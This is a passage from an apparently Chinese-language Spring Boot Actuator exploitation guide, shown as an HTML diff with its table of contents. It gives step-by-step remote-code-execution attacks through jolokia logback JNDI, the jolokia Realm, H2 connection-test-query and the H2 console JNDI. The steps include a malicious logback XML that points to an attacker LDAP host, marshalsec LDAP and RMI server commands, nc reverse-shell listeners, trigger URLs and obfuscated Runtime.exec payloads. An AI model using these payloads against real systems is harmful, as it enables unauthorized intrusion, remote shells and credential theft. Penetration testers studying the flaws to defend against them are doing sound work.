+<p>在自己控制的 <code>vps</code> 机器上开启一个简单 <code>HTTP</code> 服务器，端口尽量使用常见 <code>HTTP</code> 服务端口（<code>80</code>、<code>443</code>）</p>
+<pre><code># 使用 python 快速开启 http server
+
+python2 -m SimpleHTTPServer 80
+python3 -m http.server 80
+</code></pre>
+<p>在根目录放置以 <code>xml</code> 结尾的 <code>example.xml</code> 文件，内容如下：</p>
+<pre><code>&lt;configuration&gt;
+  &lt;insertFromJNDI env-entry-name=&quot;ldap://your-vps-ip:1389/JNDIObject&quot; as=&quot;appName&quot; /&gt;
+&lt;/configuration&gt;
+</code></pre>
+<h6 id="步骤三准备要执行的-java-代码">步骤三：准备要执行的 Java 代码</h6>
+<p>编写优化过后的用来反弹 <code>shell</code> 的 <code>Java</code> 示例代码 <code>JNDIObject.java</code>，</p>
+<p>使用兼容低版本 <code>jdk</code> 的方式编译：</p>
+<pre><code>javac -source 1.5 -target 1.5 JNDIObject.java
+</code></pre>
+<p>然后将生成的 <code>JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>
+<h6 id="步骤四架设恶意-ldap-服务">步骤四：架设恶意 ldap 服务</h6>
+<p>下载 <code>marshalsec</code> ，使用下面命令架设对应的 <code>ldap</code> 服务：</p>
+<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
+</code></pre>
+<h6 id="步骤五监听反弹-shell-的端口">步骤五：监听反弹 shell 的端口</h6>
+<p>一般使用 <code>nc</code> 监听端口，等待反弹 <code>shell</code></p>
+<pre><code>nc -lv 443
+</code></pre>
+<h6 id="步骤六从外部-url-地址加载日志配置文件">步骤六：从外部 URL 地址加载日志配置文件</h6>
+<p>如果目标成功请求了<code>example.xml</code> 并且 <code>marshalsec</code> 也接收到了目标请求，但是目标没有请求 <code>JNDIObject.class</code>，大概率是因为目标环境的 <code>jdk</code>版本太高，导致 <code>JNDI</code> 利用失败。</p>
+<p>替换实际的 <code>your-vps-ip</code> 地址访问 <code>URL</code> 触发漏洞：</p>
+<pre><code>/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml
+</code></pre>
+<h5 id="漏洞原理-4">漏洞原理：</h5>
+<ol>
+<li>
+<p>直接访问可触发漏洞的 <code>URL</code>，相当于通过 <code>jolokia</code> 调用 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 类的 <code>reloadByURL</code> 方法</p>
+</li>
+<li>
+<p>目标机器请求外部日志配置文件 <code>URL</code> 地址，获得恶意 <code>xml</code> 文件内容</p>
+</li>
+<li>
+<p>目标机器使用 <code>saxParser.parse</code> 解析 <code>xml</code> 文件 (这里导致了 <code>xxe</code> 漏洞)</p>
+</li>
+<li>
+<p><code>xml</code> 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 <code>JNDI</code> 服务器地址</p>
+</li>
+<li>
+<p>目标机器请求恶意 <code>JNDI</code> 服务器，导致 <code>JNDI</code> 注入，造成 <code>RCE</code> 漏洞</p>
+</li>
+</ol>
+<h5 id="漏洞分析-4">漏洞分析：</h5>
+<pre><code>spring boot actuator rce via jolokia
+</code></pre>
+<h5 id="漏洞环境-4">漏洞环境：</h5>
+<pre><code>repository/springboot-jolokia-logback-rce
+</code></pre>
+<p>正常访问：</p>
+<pre><code>http://127.0.0.1:9094/env
+</code></pre>
+<h4 id="0x05jolokia-realm-jndi-rce">0x05：jolokia Realm JNDI RCE</h4>
+<h5 id="利用条件-9">利用条件：</h5>
+<ul>
+<li>
+<p>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</p>
+</li>
+<li>
+<p>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 <code>MBean</code></p>
+</li>
+<li>
+<p>目标可以请求攻击者的服务器（请求可出外网）</p>
+</li>
+<li>
+<p><code>JNDI</code> 注入受目标 <code>JDK</code> 版本影响，<code>jdk &lt; 6u141/7u131/8u121</code>（<code>RMI</code> 方式）</p>
+</li>
+</ul>
+<h5 id="利用方法-8">利用方法：</h5>
+<h6 id="步骤一查看已存在的-mbeans-2">步骤一：查看已存在的 MBeans</h6>
+<p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>type=MBeanFactory</code> 和 <code>createJNDIRealm</code> 关键词。</p>
+<h6 id="步骤二准备要执行的-java-代码">步骤二：准备要执行的 Java 代码</h6>
+<p>编写优化过后的用来反弹 <code>shell</code> 的 <code>Java</code> 示例代码 <code>JNDIObject.java</code>。</p>
+<h6 id="步骤三托管-class-文件">步骤三：托管 class 文件</h6>
+<p>在自己控制的 <code>vps</code> 机器上开启一个简单 <code>HTTP</code> 服务器，端口尽量使用常见 <code>HTTP</code> 服务端口（<code>80</code>、<code>443</code>）</p>
+<pre><code># 使用 python 快速开启 http server
+
+python2 -m SimpleHTTPServer 80
+python3 -m http.server 80
+</code></pre>
+<p>将<strong>步骤二</strong>中编译好的 <code>class</code> 文件拷贝到 <code>HTTP</code> 服务器根目录。</p>
+<h6 id="步骤四架设恶意-rmi-服务">步骤四：架设恶意 rmi 服务</h6>
+<p>下载 <code>marshalsec</code> ，使用下面命令架设对应的 <code>rmi</code> 服务：</p>
+<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389
+</code></pre>
+<h6 id="步骤五监听反弹-shell-的端口-2">步骤五：监听反弹 shell 的端口</h6>
+<p>一般使用 <code>nc</code> 监听端口，等待反弹 <code>shell</code></p>
+<pre><code>nc -lvp 443
+</code></pre>
+<h6 id="步骤六发送恶意-payload">步骤六：发送恶意 payload</h6>
+<p>根据实际情况修改 <code>springboot-realm-jndi-rce.py</code> 脚本中的目标地址，<code>RMI</code> 地址、端口等信息，然后在自己控制的服务器上运行。</p>
+<h5 id="漏洞原理-5">漏洞原理：</h5>
+<ol>
+<li>
+<p>利用 <code>jolokia</code> 调用 <code>createJNDIRealm</code> 创建 <code>JNDIRealm</code></p>
+</li>
+<li>
+<p>设置 <code>connectionURL</code> 地址为 <code>RMI Service URL</code></p>
+</li>
+<li>
+<p>设置 <code>contextFactory</code> 为 <code>RegistryContextFactory</code></p>
+</li>
+<li>
+<p>停止 <code>Realm</code></p>
+</li>
+<li>
+<p>启动 <code>Realm</code> 以触发指定 <code>RMI</code> 地址的 <code>JNDI</code> 注入，造成 <code>RCE</code> 漏洞</p>
+</li>
+</ol>
+<h5 id="漏洞分析-5">漏洞分析：</h5>
+<pre><code>Yet Another Way to Exploit Spring Boot Actuators via Jolokia
+</code></pre>
+<h5 id="漏洞环境-5">漏洞环境：</h5>
+<pre><code>repository/springboot-jolokia-logback-rce
+</code></pre>
+<p>正常访问:</p>
+<pre><code>http://127.0.0.1:9094/env
+</code></pre>
+<h4 id="0x06h2-database-query-rce">0x06：h2 database query RCE</h4>
+<h5 id="利用条件-10">利用条件：</h5>
+<ul>
+<li>
+<p>可以 <code>POST</code> 请求目标网站的 <code>/env</code> 接口设置属性</p>
+</li>
+<li>
+<p>可以 <code>POST</code> 请求目标网站的 <code>/restart</code> 接口重启应用（存在<code>spring-boot-starter-actuator</code>依赖）</p>
+</li>
+<li>
+<p>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</p>
+</li>
+</ul>
+<h5 id="利用方法-9">利用方法：</h5>
+<h6 id="步骤一设置-springdatasourcehikariconnection-test-query-属性">步骤一：设置 spring.datasource.hikari.connection-test-query 属性</h6>
+<p>下面<code>payload</code> 中的 <code>'T5'</code>方法每一次执行命令后都需要更换名称 (如<code>T6</code>) ，然后才能被重新创建使用，否则下次 <code>restart</code>重启应用时漏洞不会被触发</p>
+<p>spring 1.x（无回显执行命令）</p>
+<pre><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');
+</code></pre>
+<p>spring 2.x（无回显执行命令）</p>
+<pre><code>POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');&quot;}
+</code></pre>
+<h6 id="步骤二重启应用">步骤二：重启应用</h6>
+<p>spring 1.x</p>
+<pre><code>POST /restart
+Content-Type: application/x-www-form-urlencoded
+</code></pre>
+<p>spring 2.x</p>
+<pre><code>POST /actuator/restart
+Content-Type: application/json
+</code></pre>
+<h5 id="漏洞原理-6">漏洞原理：</h5>
+<ol>
+<li>
+<p><code>spring.datasource.hikari.connection-test-query</code> 属性被设置为一条恶意的 <code>CREATE ALIAS</code> 创建自定义函数的 <code>SQL</code> 语句</p>
+</li>
+<li>
+<p>其属性对应 <code>HikariCP</code> 数据库连接池的 <code>connectionTestQuery</code> 配置，定义一个新数据库连接之前被执行的 <code>SQL</code> 语句</p>
+</li>
+<li>
+<p><code>restart</code> 重启应用，会建立新的数据库连接</p>
+</li>
+<li>
+<p>如果 <code>SQL</code> 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 <code>RCE</code> 漏洞</p>
+</li>
+</ol>
+<h5 id="漏洞分析-6">漏洞分析：</h5>
+<pre><code> remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database
+</code></pre>
+<h5 id="漏洞环境-6">漏洞环境：</h5>
+<pre><code>repository/springboot-h2-database-rce
+</code></pre>
+<p>正常访问：</p>
+<pre><code>http://127.0.0.1:9096/actuator/env
+</code></pre>
+<h4 id="0x07h2-database-console-jndi-rce">0x07：h2 database console JNDI RCE</h4>
+<h5 id="利用条件-11">利用条件：</h5>
+<ul>
+<li>
+<p>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</p>
+</li>
+<li>
+<p><code>spring</code> 配置中启用 <code>h2 console spring.h2.console.enabled=true</code></p>
+</li>
+<li>
+<p>目标可以请求攻击者的服务器（请求可出外网）</p>
+</li>
+<li>
+<p><code>JNDI</code> 注入受目标 <code>JDK</code> 版本影响，<code>jdk &lt; 6u201/7u191/8u182/11.0.1</code>（<code>LDAP</code> 方式）</p>
+</li>
+</ul>
+<h5 id="利用方法-10">利用方法：</h5>
+<h6 id="步骤一访问路由获得-jsessionid">步骤一：访问路由获得 jsessionid</h6>
+<p>直接访问目标开启 <code>h2 console</code> 的默认路由 <code>/h2-console</code>，目标会跳转到页面 <code>/h2-console/login.jsp?jsessionid=xxxxxx</code>，记录下实际的 <code>jsessionid=xxxxxx</code> 值。</p>
+<h6 id="步骤二准备要执行的-java-代码-2">步骤二：准备要执行的 Java 代码</h6>
+<p>编写优化过后的用来反弹 <code>shell</code> 的 <code>Java</code> 示例代码 <code>JNDIObject.java</code>，</p>
+<p>使用兼容低版本 <code>jdk</code> 的方式编译：</p>
+<pre><code>javac -source 1.5 -target 1.5 JNDIObject.java
+</code></pre>
+<p>然后将生成的 <code>JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>
+<h6 id="步骤三托管-class-文件-2">步骤三：托管 class 文件</h6>
+<p>在自己控制的 <code>vps</code> 机器上开启一个简单 <code>HTTP</code> 服务器，端口尽量使用常见 <code>HTTP</code> 服务端口（<code>80</code>、<code>443</code>）</p>
+<pre><code># 使用 python 快速开启 http server
+
+python2 -m SimpleHTTPServer 80
+python3 -m http.server 80
+</code></pre>
+<p>将步骤二中编译好的 <code>class</code> 文件拷贝到 <code>HTTP</code> 服务器根目录。</p>
+<h6 id="步骤四架设恶意-ldap-服务-2">步骤四：架设恶意 ldap 服务</h6>
+<p>下载 <code>marshalsec</code> ，使用下面命令架设对应的 <code>ldap</code> 服务：</p>
+<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
+</code></pre>
+<h6 id="步骤五监听反弹-shell-的端口-3">步骤五：监听反弹 shell 的端口</h6>
+<p>一般使用 <code>nc</code> 监听端口，等待反弹 <code>shell</code></p>
+<pre><code>nc -lv 443
+</code></pre>
+<h6 id="步骤六发包触发-jndi-注入">步骤六：发包触发 JNDI 注入</h6>
+<p>根据实际情况，替换下面数据中的 <code>jsessionid=xxxxxx</code>、<code>www.example.com</code> 和 <code>ldap://your-vps-ip:1389/JNDIObject</code></p>
+<pre><code>POST /h2-console/login.do?jsessionid=xxxxxx
+Host: www.example.com
+Content-Type: application/x-www-form-urlencoded
+Referer: http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxx
+
+language=en&amp;setting=Generic+H2+%28Embedded%29&amp;name=Generic+H2+%28Embedded%29&amp;driver=javax.naming.InitialContext&amp;url=ldap://your-vps-ip:1389/JNDIObject&amp;user=&amp;password=
+</code></pre>
+<h5 id="漏洞分析-7">漏洞分析：</h5>
+<p>https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&amp;mid=2247483658&amp;idx=1&amp;sn=584710da0fbe56c1246755147bcec48e&amp;scene=21#wechat_redirect</p>
+<h5 id="漏洞环境-7">漏洞环境：</h5>
+<pre><code>repository/springboot-h2-database-rce
+</code></pre>
+<p>正常访问：</p>
+<pre><code>http://127.0.0.1:9096/h2-console
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#spring_boot">Spring_Boot</a>
+<ul>
+<li><a href="#0x01%E8%B7%AF%E7%94%B1%E7%9F%A5%E8%AF%86">0x01：路由知识</a></li>
+<li><a href="#0x02%E7%89%88%E6%9C%AC%E7%9F%A5%E8%AF%86">0x02：版本知识</a>
+<ul>
+<li><a href="#%E5%B8%B8%E8%A7%81%E7%BB%84%E4%BB%B6%E7%9A%84%E7%89%88%E6%9C%AC%E7%9B%B8%E4%BA%92%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB">常见组件的版本相互依赖关系：</a></li>
+<li><a href="#spring-cloud-%E4%B8%8E-spring-boot-%E5%A4%A7%E7%89%88%E6%9C%AC%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB">Spring Cloud 与 Spring Boot 大版本之间的依赖关系：</a></li>
+<li><a href="#spring-cloud-%E5%B0%8F%E7%89%88%E6%9C%AC%E5%8F%B7%E7%9A%84%E5%90%8E%E7%BC%80%E5%8F%8A%E5%90%AB%E4%B9%89">Spring Cloud 小版本号的后缀及含义:</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E4%B8%80%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">一：信息泄露</a>
+<ul>
+<li><a href="#0x01%E8%B7%AF%E7%94%B1%E5%9C%B0%E5%9D%80%E5%8F%8A%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E8%AF%A6%E6%83%85%E6%B3%84%E6%BC%8F">0x01：路由地址及接口调用详情泄漏</a></li>
+<li><a href="#0x02%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E8%80%8C%E6%9A%B4%E9%9C%B2%E7%9A%84%E8%B7%AF%E7%94%B1">0x02：配置不当而暴露的路由</a></li>
+<li><a href="#0x03%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%80">0x03：获取被星号脱敏的密码的明文 (方法一)</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95">利用方法：</a>
+<ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D">步骤一：找到想要获取的属性名</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8Cjolokia-%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3-mbean-%E8%8E%B7%E5%8F%96%E6%98%8E%E6%96%87">步骤二：jolokia 调用相关 Mbean 获取明文</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#0x04%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%BA%8C">0x04：获取被星号脱敏的密码的明文 (方法二)</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-2">利用方法：</a>
+<ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-2">步骤一：找到想要获取的属性名</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E4%BD%BF%E7%94%A8-nc-%E7%9B%91%E5%90%AC-http-%E8%AF%B7%E6%B1%82">步骤二：使用 nc 监听 HTTP 请求</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E8%AE%BE%E7%BD%AE-eurekaclientserviceurldefaultzone-%E5%B1%9E%E6%80%A7">步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE">步骤四：刷新配置</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%94%E8%A7%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%80%BC">步骤五：解码属性值</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#0x05%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%89">0x05：获取被星号脱敏的密码的明文 (方法三)</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-3">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-3">利用方法：</a>
+<ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-3">步骤一：找到想要获取的属性名</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E4%BD%BF%E7%94%A8-nc-%E7%9B%91%E5%90%AC-http-%E8%AF%B7%E6%B1%82-2">步骤二：使用 nc 监听 HTTP 请求</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E8%A7%A6%E5%8F%91%E5%AF%B9%E5%A4%96-http-%E8%AF%B7%E6%B1%82">步骤三：触发对外 http 请求</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE-2">步骤四：刷新配置</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#0x06%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E5%9B%9B">0x06：获取被星号脱敏的密码的明文 (方法四)</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-4">利用条件：</a>
+<ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-4">步骤一：找到想要获取的属性名</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E4%B8%8B%E8%BD%BD-jvm-heap-%E4%BF%A1%E6%81%AF">步骤二：下载 jvm heap 信息</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E4%BD%BF%E7%94%A8-mat-%E8%8E%B7%E5%BE%97-jvm-heap-%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87">步骤三：使用 MAT 获得 jvm heap 中的密码明文</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E4%BA%8C%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">二：远程代码执行</a>
+<ul>
+<li><a href="#0x01whitelabel-error-page-spel-rce">0x01：whitelabel error page SpEL RCE</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-5">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-4">利用方法：</a>
+<ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E6%AD%A3%E5%B8%B8%E4%BC%A0%E5%8F%82%E5%A4%84">步骤一：找到一个正常传参处</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%89%A7%E8%A1%8C-spel-%E8%A1%A8%E8%BE%BE%E5%BC%8F">步骤二：执行 SpEL 表达式</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83">漏洞环境：</a></li>
+</ul>
+</li>
+<li><a href="#0x02spring-cloud-snakeyaml-rce">0x02：spring cloud SnakeYAML RCE</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-6">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-5">利用方法：</a>
+<ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%98%E7%AE%A1-yml-%E5%92%8C-jar-%E6%96%87%E4%BB%B6">步骤一：托管 yml 和 jar 文件</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E8%AE%BE%E7%BD%AE-springcloudbootstraplocation-%E5%B1%9E%E6%80%A7">步骤二：设置 spring.cloud.bootstrap.location 属性</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE">步骤三：刷新配置</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2">漏洞原理：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2">漏洞分析：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-2">漏洞环境：</a></li>
+</ul>
+</li>
+<li><a href="#0x03eureka-xstream-deserialization-rce">0x03：eureka xstream deserialization RCE</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-7">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-6">利用方法：</a>
+<ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9E%B6%E8%AE%BE%E5%93%8D%E5%BA%94%E6%81%B6%E6%84%8F-xstream-payload-%E7%9A%84%E7%BD%91%E7%AB%99">步骤一：架设响应恶意 XStream payload 的网站</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3">步骤二：监听反弹 shell 的端口</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E8%AE%BE%E7%BD%AE-eurekaclientserviceurldefaultzone-%E5%B1%9E%E6%80%A7-2">步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE-3">步骤四：刷新配置</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3">漏洞原理：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3">漏洞分析：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-3">漏洞环境：</a></li>
+</ul>
+</li>
+<li><a href="#0x04jolokia-logback-jndi-rce">0x04：jolokia logback JNDI RCE</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-8">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-7">利用方法：</a>
+<ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%AD%98%E5%9C%A8%E7%9A%84-mbeans">步骤一：查看已存在的 MBeans</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%89%98%E7%AE%A1-xml-%E6%96%87%E4%BB%B6">步骤二：托管 xml 文件</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81">步骤三：准备要执行的 Java 代码</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-ldap-%E6%9C%8D%E5%8A%A1">步骤四：架设恶意 ldap 服务</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3">步骤五：监听反弹 shell 的端口</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%85%AD%E4%BB%8E%E5%A4%96%E9%83%A8-url-%E5%9C%B0%E5%9D%80%E5%8A%A0%E8%BD%BD%E6%97%A5%E5%BF%97%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">步骤六：从外部 URL 地址加载日志配置文件</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-4">漏洞原理：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-4">漏洞分析：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-4">漏洞环境：</a></li>
+</ul>
+</li>
+<li><a href="#0x05jolokia-realm-jndi-rce">0x05：jolokia Realm JNDI RCE</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-9">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-8">利用方法：</a>
+<ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%AD%98%E5%9C%A8%E7%9A%84-mbeans-2">步骤一：查看已存在的 MBeans</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81">步骤二：准备要执行的 Java 代码</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E6%89%98%E7%AE%A1-class-%E6%96%87%E4%BB%B6">步骤三：托管 class 文件</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-rmi-%E6%9C%8D%E5%8A%A1">步骤四：架设恶意 rmi 服务</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3-2">步骤五：监听反弹 shell 的端口</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%85%AD%E5%8F%91%E9%80%81%E6%81%B6%E6%84%8F-payload">步骤六：发送恶意 payload</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-5">漏洞原理：</a></li>
